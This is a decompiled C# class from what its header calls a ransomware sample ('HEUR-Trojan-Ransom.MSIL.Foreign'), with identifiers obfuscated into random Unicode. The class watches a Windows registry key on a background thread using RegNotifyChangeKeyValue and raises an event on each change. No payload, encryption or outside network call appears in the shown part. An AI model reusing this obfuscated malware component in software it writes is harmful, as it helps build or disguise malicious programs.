// Decompiled with JetBrains decompiler
// Type: ր֬ᏉṢᡄẼ஗ᱻసҡƬོᒉࢲʗᎎཛྷ.᩠঻ڡႺԔ૬ሜ࿴
// Assembly: update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7E0159D6-932F-4F32-8DCB-751F61B22DA0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-1e13fd2b44573360e0d5f6cc2d3a4e1161d119837d808fac0c43885d53ec395f.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using ր֬ᏉṢᡄẼ\u0B97ᱻసҡƬོᒉࢲʗᎎཛྷ;

namespace ր֬ᏉṢᡄẼ\u0B97ᱻసҡƬོᒉࢲʗᎎཛྷ
{
  public class \u1A60\u09BBڡႺԔ૬ሜ\u0FF4 : IDisposable
  {
    private const int \u0D5Bᆪཌྷѝᨻᔪ༩\u0095ޯƶ\u0C5Cጺǯᐔଝ = 1;
    private const int ǧጜȱкᆫ໖бᄍ\u135Cೣٿలᰬ᳡\u0AD6\u061B\u1ACEᦆѹ = 16;
    private const int ᬟ\u009FਦἈ\u0EE4ዘḟݼ౯ = 131072;
    private static readonly IntPtr ʍᑌ\u0F3A\u1B77ׅᮯṩᕜѣ᷄\u0D78ᵿ၁ൗຫ = new IntPtr(int.MinValue);
    private static readonly IntPtr Ψ\u0A0Dᘠـឫި = new IntPtr(-2147483647);
    private static readonly IntPtr ƨώňࣵɩᒖḒ\u0FF7\u1BF5ҝᶋ\u0A56 = new IntPtr(-2147483646);
    private static readonly IntPtr \u1C37\u00B4\u171C\u0E67۱ղᔣ\u05F4ᬻ᳟ྜྷᰏၝ = new IntPtr(-2147483645);
    private static readonly IntPtr \u0F2Fᐑႛخ\u1CA4ᨤұඒឨѽ = new IntPtr(-2147483644);
    private static readonly IntPtr ᰀÆ\u0590\u0DCDჃᣡᇶ́ᱸ\u05FF\u02F4ሰ\u07B9 = new IntPtr(-2147483643);
    private static readonly IntPtr ሹᇅদ֬دცదᅋࢩ\u0EE3ᬥ\u0B5Aᶯçཱುລࡋኟ = new IntPtr(-2147483642);
    private IntPtr ᄏዐྷᚚ\u19E8ốఋᑝඎȳᅿᩴȱፃቘᵦʻ;
    private string \u1944ɸᛏᖼܒᆷ;
    private object ᘒἍᑚẼ\u0C8Dᣥտԏ = new object();
    private Thread \u0BD8ؽͭ\u0E92ᆒɏᰕᇁᰜ;
    private bool \u08CAಱ\u0F48Ỏ\u137A\u0C8Dᒡ;
    private ManualResetEvent \u17E3\u02F0Σ᪒\u0BBDᵀ\u0FDBϖἃᛰᓠĀ\u088E\u0BFF = new ManualResetEvent(false);
    private ሯᜬ֠\u0CDCȞ ᢦݫఛ\u19F9\u1369ၖᛴ֢ԍᣟæ࣬᥎ۉ\u003F = ሯᜬ֠\u0CDCȞ.\u1085ᦿխ\u1DF7රʋԤ | ሯᜬ֠\u0CDCȞ.ᬜ᳝ᰊᚌᗡᝢݟᇔĸ\u02EDî\u1C8DᷖƲ\u0AD6ᑓᗌ\u1C4C | ሯᜬ֠\u0CDCȞ.ᘐʱऔ\u02EDṣፆ\u137Eᘦᆛᒋᒱʚᑨ\u007Dࠬᴃ͉డ\u02C2 | ሯᜬ֠\u0CDCȞ.\u081Cᣁ\u005Bᗳʳ௭Ӑڑ໒\u0EE9ၙࠪ;

    public \u1A60\u09BBڡႺԔ૬ሜ\u0FF4(RegistryKey registryKey) => this.\u0875\u0085ᤥQෳደᇩࠟᚇ(registryKey.Name);

    public \u1A60\u09BBڡႺԔ૬ሜ\u0FF4(string name)
    {
      switch (name)
      {
        case "":
        case null:
          throw new ArgumentNullException(nameof (name));
        default:
          this.\u0875\u0085ᤥQෳደᇩࠟᚇ(name);
          break;
      }
    }

    public \u1A60\u09BBڡႺԔ૬ሜ\u0FF4(RegistryHive registryHive, string subKey) => this.ܨḎዛਂүഉكڌൿᬻl(registryHive, subKey);

    [DllImport("advapi32.dll", EntryPoint = "RegOpenKeyEx", SetLastError = true)]
    private static extern int টༀవໜ\u0DF5Bࣧࠬෟឰᗡജ\u002Aể၅\u0BE5(
      IntPtr _param0,
      string _param1,
      uint _param2,
      int _param3,
      out IntPtr _param4);

    [DllImport("advapi32.dll", EntryPoint = "RegNotifyChangeKeyValue", SetLastError = true)]
    private static extern int ሬ॑ୱޖ\u173A٠ᘒ(
      IntPtr ႰจᗳᏈᙯًԉ᩼ᦀ᱙ҼǀϵȗK,
      bool _param1,
      ሯᜬ֠\u0CDCȞ _param2,
      IntPtr _param3,
      bool _param4);

    [DllImport("advapi32.dll", EntryPoint = "RegCloseKey", SetLastError = true)]
    private static extern int \u032Bᬉ᮶ყᕔ\u17F3ን\u09F2ຢ\u0A4Fẓᕃᘎḻჽɡ(IntPtr _param0);

    public event EventHandler RegChanged;

    protected virtual void OnRegChanged()
    {
      EventHandler ҫྒᝧϽ᳧ᤍጤǠ۟੪ᩊ = this.\u0A31ҫྒᝧ\u0A78Ͻ᳧ᤍጤ\u05ED\u0C3Aǡ\u08E1۟੪\u085Eᩊ;
      if (ҫྒᝧϽ᳧ᤍጤǠ۟੪ᩊ == null)
        return;
      ҫྒᝧϽ᳧ᤍጤǠ۟੪ᩊ((object) this, (EventArgs) null);
    }

    public event ErrorEventHandler Error;

    protected virtual void OnError(Exception _param1)
    {
    }

    public void Dispose()
    {
      this.Ճ\u088Fೋก\u0DFBྲྀᖡቪຯ\u0FFAሺ\u1737ƜՐ᱒\u0001ᆘৠտ();
      this.\u08CAಱ\u0F48Ỏ\u137A\u0C8Dᒡ = true;
      GC.SuppressFinalize((object) this);
    }

    public ሯᜬ֠\u0CDCȞ \u0307טᕤ\u0D64ઙᱦᅠྠ݊᠑Տᩡݶᔥၕᇔ
    {
      get => this.ᢦݫఛ\u19F9\u1369ၖᛴ֢ԍᣟæ࣬᥎ۉ\u003F;
      set
      {
        lock (this.ᘒἍᑚẼ\u0C8Dᣥտԏ)
        {
          if (this.ବӽԢᓲḍ\u136DڎळᣋऊѼडᩗᬥޭྋŚᦖ)
            throw new InvalidOperationException("Monitoring thread is already running");
          this.ᢦݫఛ\u19F9\u1369ၖᛴ֢ԍᣟæ࣬᥎ۉ\u003F = value;
        }
      }
    }

    private void ܨḎዛਂүഉكڌൿᬻl(RegistryHive _param1, string _param2)
    {
      switch (_param1)
      {
        case RegistryHive.ClassesRoot:
          this.ᄏዐྷᚚ\u19E8ốఋᑝඎȳᅿᩴȱፃቘᵦʻ = \u1A60\u09BBڡႺԔ૬ሜ\u0FF4.ʍᑌ\u0F3A\u1B77ׅᮯṩᕜѣ᷄\u0D78ᵿ၁ൗຫ;
          break;
        case RegistryHive.CurrentUser:
          this.ᄏዐྷᚚ\u19E8ốఋᑝඎȳᅿᩴȱፃቘᵦʻ = \u1A60\u09BBڡႺԔ૬ሜ\u0FF4.Ψ\u0A0Dᘠـឫި;
          break;
        case RegistryHive.LocalMachine:
          this.ᄏዐྷᚚ\u19E8ốఋᑝඎȳᅿᩴȱፃቘᵦʻ = \u1A60\u09BBڡႺԔ૬ሜ\u0FF4.ƨώňࣵɩᒖḒ\u0FF7\u1BF5ҝᶋ\u0A56;
          break;
        case RegistryHive.Users:
          this.ᄏዐྷᚚ\u19E8ốఋᑝඎȳᅿᩴȱፃቘᵦʻ = \u1A60\u09BBڡႺԔ૬ሜ\u0FF4.\u1C37\u00B4\u171C\u0E67۱ղᔣ\u05F4ᬻ᳟ྜྷᰏၝ;
          break;
        case RegistryHive.PerformanceData:
          this.ᄏዐྷᚚ\u19E8ốఋᑝඎȳᅿᩴȱፃቘᵦʻ = \u1A60\u09BBڡႺԔ૬ሜ\u0FF4.\u0F2Fᐑႛخ\u1CA4ᨤұඒឨѽ;
          break;
        case RegistryHive.CurrentConfig:
          this.ᄏዐྷᚚ\u19E8ốఋᑝඎȳᅿᩴȱፃቘᵦʻ = \u1A60\u09BBڡႺԔ૬ሜ\u0FF4.ᰀÆ\u0590\u0DCDჃᣡᇶ́ᱸ\u05FF\u02F4ሰ\u07B9;
          break;
        case RegistryHive.DynData:
          this.ᄏዐྷᚚ\u19E8ốఋᑝඎȳᅿᩴȱፃቘᵦʻ = \u1A60\u09BBڡႺԔ૬ሜ\u0FF4.ሹᇅদ֬دცదᅋࢩ\u0EE3ᬥ\u0B5Aᶯçཱುລࡋኟ;
          break;
        default:
          throw new InvalidEnumArgumentException("hive", (int) _param1, typeof (RegistryHive));
      }
      this.\u1944ɸᛏᖼܒᆷ = _param2;
    }

    private void \u0875\u0085ᤥQෳደᇩࠟᚇ(string _param1)
    {
      string[] strArray = _param1.Split('\\');
      switch (strArray[0])
      {
        case "HKEY_CLASSES_ROOT":
        case "HKCR":
          this.ᄏዐྷᚚ\u19E8ốఋᑝඎȳᅿᩴȱፃቘᵦʻ = \u1A60\u09BBڡႺԔ૬ሜ\u0FF4.ʍᑌ\u0F3A\u1B77ׅᮯṩᕜѣ᷄\u0D78ᵿ၁ൗຫ;
          break;
        case "HKEY_CURRENT_USER":
        case "HKCU":
          this.ᄏዐྷᚚ\u19E8ốఋᑝඎȳᅿᩴȱፃቘᵦʻ = \u1A60\u09BBڡႺԔ૬ሜ\u0FF4.Ψ\u0A0Dᘠـឫި;
          break;
        case "HKEY_LOCAL_MACHINE":
        case "HKLM":
          this.ᄏዐྷᚚ\u19E8ốఋᑝඎȳᅿᩴȱፃቘᵦʻ = \u1A60\u09BBڡႺԔ૬ሜ\u0FF4.ƨώňࣵɩᒖḒ\u0FF7\u1BF5ҝᶋ\u0A56;
          break;
        case "HKEY_USERS":
          this.ᄏዐྷᚚ\u19E8ốఋᑝඎȳᅿᩴȱፃቘᵦʻ = \u1A60\u09BBڡႺԔ૬ሜ\u0FF4.\u1C37\u00B4\u171C\u0E67۱ղᔣ\u05F4ᬻ᳟ྜྷᰏၝ;
          break;
        case "HKEY_CURRENT_CONFIG":
          this.ᄏዐྷᚚ\u19E8ốఋᑝඎȳᅿᩴȱፃቘᵦʻ = \u1A60\u09BBڡႺԔ૬ሜ\u0FF4.ᰀÆ\u0590\u0DCDჃᣡᇶ́ᱸ\u05FF\u02F4ሰ\u07B9;
          break;
        default:
          this.ᄏዐྷᚚ\u19E8ốఋᑝඎȳᅿᩴȱፃቘᵦʻ = IntPtr.Zero;
          throw new ArgumentException("The registry hive '" + strArray[0] + "' is not supported", "value");
      }
      this.\u1944ɸᛏᖼܒᆷ = string.Join("\\", strArray, 1, strArray.Length - 1);
    }

    public bool ବӽԢᓲḍ\u136DڎळᣋऊѼडᩗᬥޭྋŚᦖ => this.\u0BD8ؽͭ\u0E92ᆒɏᰕᇁᰜ != null;

    public void ʲတཇᄍ\u0D0D\u0FD3ݳᐞ\u0F03߁ᢉỞቿᐸ()
    {
      if (this.\u08CAಱ\u0F48Ỏ\u137A\u0C8Dᒡ)
        throw new ObjectDisposedException((string) null, "This instance is already disposed");
      lock (this.ᘒἍᑚẼ\u0C8Dᣥտԏ)
      {
        if (this.ବӽԢᓲḍ\u136DڎळᣋऊѼडᩗᬥޭྋŚᦖ)
          return;
        this.\u17E3\u02F0Σ᪒\u0BBDᵀ\u0FDBϖἃᛰᓠĀ\u088E\u0BFF.Reset();
        this.\u0BD8ؽͭ\u0E92ᆒɏᰕᇁᰜ = new Thread(new ThreadStart(this.\u08EB᱑̓\u0EEDᡱ\u1758ݺóᗓ\u05CE));
        this.\u0BD8ؽͭ\u0E92ᆒɏᰕᇁᰜ.IsBackground = true;
        this.\u0BD8ؽͭ\u0E92ᆒɏᰕᇁᰜ.Start();
      }
    }

    public void Ճ\u088Fೋก\u0DFBྲྀᖡቪຯ\u0FFAሺ\u1737ƜՐ᱒\u0001ᆘৠտ()
    {
      if (this.\u08CAಱ\u0F48Ỏ\u137A\u0C8Dᒡ)
        throw new ObjectDisposedException((string) null, "This instance is already disposed");
      lock (this.ᘒἍᑚẼ\u0C8Dᣥտԏ)
      {
        Thread ؽͭᆒɏᰕᇁᰜ = this.\u0BD8ؽͭ\u0E92ᆒɏᰕᇁᰜ;
        if (ؽͭᆒɏᰕᇁᰜ == null)
          return;
        this.\u17E3\u02F0Σ᪒\u0BBDᵀ\u0FDBϖἃᛰᓠĀ\u088E\u0BFF.Set();
        ؽͭᆒɏᰕᇁᰜ.Join();
      }
    }

    private void \u08EB᱑̓\u0EEDᡱ\u1758ݺóᗓ\u05CE()
    {
      try
      {
        this.ͿἏ\u19E6Ƅ\u0C5B\u058Aᙳᢧ\u0CFEᰘᏒठቄکۼ\u0ADAۥᠾ();
      }
      catch (Exception ex)
      {
        this.OnError(ex);
      }
      this.\u0BD8ؽͭ\u0E92ᆒɏᰕᇁᰜ = (Thread) null;
    }

    private void ͿἏ\u19E6Ƅ\u0C5B\u058Aᙳᢧ\u0CFEᰘᏒठቄکۼ\u0ADAۥᠾ()
    {
      IntPtr ႰจᗳᏈᙯًԉ᩼ᦀ᱙ҼǀϵȗK;
      int error1 = \u1A60\u09BBڡႺԔ૬ሜ\u0FF4.টༀవໜ\u0DF5Bࣧࠬෟឰᗡജ\u002Aể၅\u0BE5(this.ᄏዐྷᚚ\u19E8ốఋᑝඎȳᅿᩴȱፃቘᵦʻ, this.\u1944ɸᛏᖼܒᆷ, 0U, 131089, out ႰจᗳᏈᙯًԉ᩼ᦀ᱙ҼǀϵȗK);
      if (error1 != 0)
        throw new Win32Exception(error1);
      try
      {
        AutoResetEvent autoResetEvent = new AutoResetEvent(false);
        WaitHandle[] waitHandles = new WaitHandle[2]
        {
          (WaitHandle) autoResetEvent,
          (WaitHandle) this.\u17E3\u02F0Σ᪒\u0BBDᵀ\u0FDBϖἃᛰᓠĀ\u088E\u0BFF
        };
        while (!this.\u17E3\u02F0Σ᪒\u0BBDᵀ\u0FDBϖἃᛰᓠĀ\u088E\u0BFF.WaitOne(0, true))
        {
          int error2 = \u1A60\u09BBڡႺԔ૬ሜ\u0FF4.ሬ॑ୱޖ\u173A٠ᘒ(ႰจᗳᏈᙯًԉ᩼ᦀ᱙ҼǀϵȗK, true, this.ᢦݫఛ\u19F9\u1369ၖᛴ֢ԍᣟæ࣬᥎ۉ\u003F, autoResetEvent.SafeWaitHandle.DangerousGetHandle(), true);
          if (error2 != 0)
            throw new Win32Exception(error2);
          if (WaitHandle.WaitAny(waitHandles) == 0)
            this.OnRegChanged();
        }
      }
      finally
      {
        if (ႰจᗳᏈᙯًԉ᩼ᦀ᱙ҼǀϵȗK != IntPtr.Zero)
          \u1A60\u09BBڡႺԔ૬ሜ\u0FF4.\u032Bᬉ᮶ყᕔ\u17F3ን\u09F2ຢ\u0A4Fẓᕃᘎḻჽɡ(ႰจᗳᏈᙯًԉ᩼ᦀ᱙ҼǀϵȗK);
      }
    }
  }
}
